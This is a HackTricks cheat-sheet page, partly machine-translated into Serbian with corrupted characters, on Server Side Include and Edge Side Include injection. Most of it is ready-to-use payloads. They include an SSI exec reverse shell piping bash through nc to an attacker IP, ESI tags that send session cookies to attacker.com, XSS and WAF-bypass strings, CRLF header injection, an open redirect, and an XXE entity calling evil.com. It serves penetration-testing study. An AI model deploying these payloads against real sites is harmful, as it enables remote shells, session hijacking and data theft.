# Server Side Inclusion/Edge Side Inclusion Injection

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 游눫 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Server Side Inclusion Basic Information

**(Uvod preuzet iz [Apache docs](https://httpd.apache.org/docs/current/howto/ssi.html))**

SSI (Server Side Includes) su direktive koje su **postavljene u HTML stranicama i evaluiraju se na serveru** dok se stranice serviraju. Omogu캖avaju vam da **dodate dinami캜ki generisani sadr쬬j** postoje캖oj HTML stranici, bez potrebe da se cela stranica servira putem CGI programa ili druge dinami캜ke tehnologije.\
Na primer, mo쬰te postaviti direktivu u postoje캖u HTML stranicu, kao 코to je:

`<!--#echo var="DATE_LOCAL" -->`

I, kada se stranica servira, ovaj fragment 캖e biti evaluiran i zamenjen svojom vredno코캖u:

`Tuesday, 15-Jan-2013 19:28:54 EST`

Odluka kada koristiti SSI, a kada imati va코u stranicu potpuno generisanu nekim programom, obi캜no zavisi od toga koliko je stranica stati캜na, a koliko treba da se prera캜unava svaki put kada se stranica servira. SSI je odli캜an na캜in da dodate male delove informacija, kao 코to je trenutni vreme - prikazano iznad. Ali ako se ve캖ina va코e stranice generi코e u trenutku kada se servira, trebate potra쬴ti neko drugo re코enje.

Mo쬰te pretpostaviti prisustvo SSI ako web aplikacija koristi datoteke sa ekstenzijama \*\* `.shtml`, `.shtm` ili `.stm`\*\*, ali to nije jedini slu캜aj.

Tipi캜na SSI ekspresija ima slede캖i format:
```
<!--#directive param="value" -->
```
### 쮏쒫왐햟
```javascript
// Document name
<!--#echo var="DOCUMENT_NAME" -->
// Date
<!--#echo var="DATE_LOCAL" -->

// File inclusion
<!--#include virtual="/index.html" -->
// Including files (same directory)
<!--#include file="file_to_include.html" -->
// CGI Program results
<!--#include virtual="/cgi-bin/counter.pl" -->
// Including virtual files (same directory)
<!--#include virtual="file_to_include.html" -->
// Modification date of a file
<!--#flastmod file="index.html" -->

// Command exec
<!--#exec cmd="dir" -->
// Command exec
<!--#exec cmd="ls" -->
// Reverse shell
<!--#exec cmd="mkfifo /tmp/foo;nc <PENTESTER IP> <PORT> 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->

// Print all variables
<!--#printenv -->
// Setting variables
<!--#set var="name" value="Rich" -->

```
## Edge Side Inclusion

Postoji problem **ke코iranja informacija ili dinami캜kih aplikacija** jer deo sadr쬬ja mo쬰 da bude **razli캜it** prilikom slede캖eg preuzimanja sadr쬬ja. To je ono za 코ta se koristi **ESI**, da ozna캜i kori코캖enje ESI oznaka za **dinami캜ki sadr쬬j koji treba da se generi코e** pre slanja ke코irane verzije.\
Ako **napada캜** mo쬰 da **ubaci ESI oznaku** unutar ke코iranog sadr쬬ja, onda bi mogao da **ubaci proizvoljan sadr쬬j** u dokument pre nego 코to bude poslat korisnicima.

### ESI Detection

Slede캖a **zaglavlja** u odgovoru sa servera zna캜i da server koristi ESI:
```
Surrogate-Control: content="ESI/1.0"
```
Ako ne mo쬰te prona캖i ovaj header, server **mo쬯a koristi ESI u svakom slu캜aju**.\
**Pristup slepoj eksploataciji se tako캠e mo쬰 koristiti** jer bi zahtev trebao sti캖i do servera napada캜a:
```javascript
// Basic detection
hell<!--esi-->o
// If previous is reflected as "hello", it's vulnerable

// Blind detection
<esi:include src=http://attacker.com>

// XSS Exploitation Example
<esi:include src=http://attacker.com/XSSPAYLOAD.html>

// Cookie Stealer (bypass httpOnly flag)
<esi:include src=http://attacker.com/?cookie_stealer.php?=$(HTTP_COOKIE)>

// Introduce private local files (Not LFI per se)
<esi:include src="supersecret.txt">

// Valid for Akamai, sends debug information in the response
<esi:debug/>
```
### ESI eksploatacija

[GoSecure je kreirao](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/) tabelu za razumevanje mogu캖ih napada koje mo쬰mo poku코ati protiv razli캜itih ESI-capable softvera, u zavisnosti od podr쬬ne funkcionalnosti:

* **Includes**: Podr쬬va `<esi:includes>` direktivu
* **Vars**: Podr쬬va `<esi:vars>` direktivu. Korisno za zaobila쬰nje XSS filtera
* **Cookie**: Kola캜i캖i dokumenta su dostupni ESI engine-u
* **Upstream Headers Required**: Surrogate aplikacije ne캖e obraditi ESI izjave osim ako upstream aplikacija ne obezbedi zaglavlja
* **Host Allowlist**: U ovom slu캜aju, ESI uklju캜ivanja su mogu캖a samo sa dozvoljenih server hostova, 코to 캜ini SSRF, na primer, mogu캖im samo protiv tih hostova

|         **Softver**         | **Includes** | **Vars** | **Kola캜i캖i** | **Upstream Headers Required** | **Host Whitelist** |
| :--------------------------: | :----------: | :------: | :---------: | :---------------------------: | :----------------: |
|            Squid3            |      Da      |    Da    |     Da      |              Da               |         Ne         |
|         Varnish Cache        |      Da      |    Ne     |      Ne     |              Da               |         Da         |
|            Fastly            |      Da      |    Ne     |      Ne     |               Ne              |         Da         |
| Akamai ESI Test Server (ETS) |      Da      |    Da    |     Da      |               Ne              |         Ne         |
|          NodeJS esi          |      Da      |    Da    |     Da      |               Ne              |         Ne         |
|         NodeJS nodesi        |      Da      |    Ne     |      Ne     |               Ne              |      Opcionalno    |

#### XSS

Slede캖a ESI direktiva 캖e u캜itati proizvoljnu datoteku unutar odgovora servera
```xml
<esi:include src=http://attacker.com/xss.html>
```
#### Zaobila쬰nje za코tite od XSS na klijentu
```xml
x=<esi:assign name="var1" value="'cript'"/><s<esi:vars name="$(var1)"/>>alert(/Chrome%20XSS%20filter%20bypass/);</s<esi:vars name="$(var1)"/>>

Use <!--esi--> to bypass WAFs:
<scr<!--esi-->ipt>aler<!--esi-->t(1)</sc<!--esi-->ript>
<img+src=x+on<!--esi-->error=ale<!--esi-->rt(1)>
```
#### Ukradi kola캜i캖

* Udaljeno ukradeni kola캜i캖
```xml
<esi:include src=http://attacker.com/$(HTTP_COOKIE)>
<esi:include src="http://attacker.com/?cookie=$(HTTP_COOKIE{'JSESSIONID'})" />
```
* Ukrao kola캜i캖 HTTP\_ONLY pomo캖u XSS reflektovanjem u odgovoru:
```bash
# This will reflect the cookies in the response
<!--esi $(HTTP_COOKIE) -->
# Reflect XSS (you can put '"><svg/onload=prompt(1)>' URL encoded and the URL encode eveyrhitng to send it in the HTTP request)
<!--esi/$url_decode('"><svg/onload=prompt(1)>')/-->

# It's possible to put more complex JS code to steal cookies or perform actions
```
#### Privatna Lokalna Datoteka

Ne me코ajte ovo sa "Uklju캜ivanjem Lokalnih Datoteka":
```markup
<esi:include src="secret.txt">
```
#### CRLF
```markup
<esi:include src="http://anything.com%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0aJunkHeader:%20JunkValue/"/>
```
#### Open Redirect

Slede캖e 캖e dodati `Location` header u odgovor
```bash
<!--esi $add_header('Location','http://attacker.com') -->
```
#### Add Header

* Dodajte zaglavlje u forsiranom zahtevu
```xml
<esi:include src="http://example.com/asdasd">
<esi:request_header name="User-Agent" value="12345"/>
</esi:include>
```
* Dodajte zaglavlje u odgovor (korisno za zaobila쬰nje "Content-Type: text/json" u odgovoru sa XSS)
```bash
<!--esi/$add_header('Content-Type','text/html')/-->

<!--esi/$(HTTP_COOKIE)/$add_header('Content-Type','text/html')/$url_decode($url_decode('"><svg/onload=prompt(1)>'))/-->

# Check the number of url_decode to know how many times you can URL encode the value
```
#### CRLF u Add header (**CVE-2019-2438**)
```xml
<esi:include src="http://example.com/asdasd">
<esi:request_header name="User-Agent" value="12345
Host: anotherhost.com"/>
</esi:include>
```
#### Akamai debug

Ovo 캖e poslati informacije za debagovanje uklju캜ene u odgovor:
```xml
<esi:debug/>
```
### ESI + XSLT = XXE

Specifikovanjem `xslt` vrednosti za _dca_ parametar, mogu캖e je uklju캜iti **`eXtensible Stylesheet Language Transformations (XSLT)`** zasnovan ESI. Uklju캜ivanje uzrokuje da HTTP zamena preuzme XML i XSLT datoteke, pri 캜emu potonja filtrira prvu. Takve XML datoteke su podlo쬹e _XML External Entity (XXE)_ napadima, omogu캖avaju캖i napada캜ima da izvr코e SSRF napade. Me캠utim, korisnost ovog pristupa je ograni캜ena jer ESI ve캖 slu쬴 kao SSRF vektor. Zbog odsustva podr코ke u osnovnoj Xalan biblioteci, spoljne DTD-ove ne obra캠uju, spre캜avaju캖i ekstrakciju lokalnih datoteka.
```xml
<esi:include src="http://host/poc.xml" dca="xslt" stylesheet="http://host/poc.xsl" />
```
XSLT datoteka:
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "http://evil.com/file" >]>
<foo>&xxe;</foo>
```
Check the XSLT page:

{% content-ref url="xslt-server-side-injection-extensible-stylesheet-language-transformations.md" %}
[xslt-server-side-injection-extensible-stylesheet-language-transformations.md](xslt-server-side-injection-extensible-stylesheet-language-transformations.md)
{% endcontent-ref %}

### References

* [https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/)
* [https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/](https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/)
* [https://academy.hackthebox.com/module/145/section/1304](https://academy.hackthebox.com/module/145/section/1304)
* [https://infosecwriteups.com/exploring-the-world-of-esi-injection-b86234e66f91](https://infosecwriteups.com/exploring-the-world-of-esi-injection-b86234e66f91)

## Lista za otkrivanje Brute-Force

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssi_esi.txt" %}

{% hint style="success" %}
U캜ite i ve쬭ajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
U캜ite i ve쬭ajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podr코ka HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
